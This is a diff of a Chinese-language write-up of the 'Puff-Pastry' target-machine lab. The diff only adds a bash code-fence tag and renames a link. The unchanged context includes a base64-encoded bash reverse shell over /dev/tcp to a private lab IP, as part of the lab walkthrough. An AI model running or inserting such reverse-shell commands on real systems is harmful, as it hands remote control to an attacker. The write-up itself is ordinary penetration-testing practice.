@@ -27,7 +27,7 @@ java后端
 ![](https://img.l1uyun.one/Puff-Pastry打靶记录_image_4.png)
 
 拿一个反弹shell
-```
+```bash
 echo 'bash -i 5<>/dev/tcp/192.168.122.102/1234 0>&5 1>&5' | base64
 
 bash -c {echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK}|{base64,-d}|{bash,-i}
@@ -541,5 +541,5 @@ flag=# SELECT * FROM FLAG;
 ```
 
 # links
-[Puff-Pastry](https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Puff-Pastry/)
+[Puff-Pastry | Target Machines WriteUp](https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Puff-Pastry/)
 [FRP内网穿透及多级代理的使用](https://blog.csdn.net/imtech/article/details/139829808)
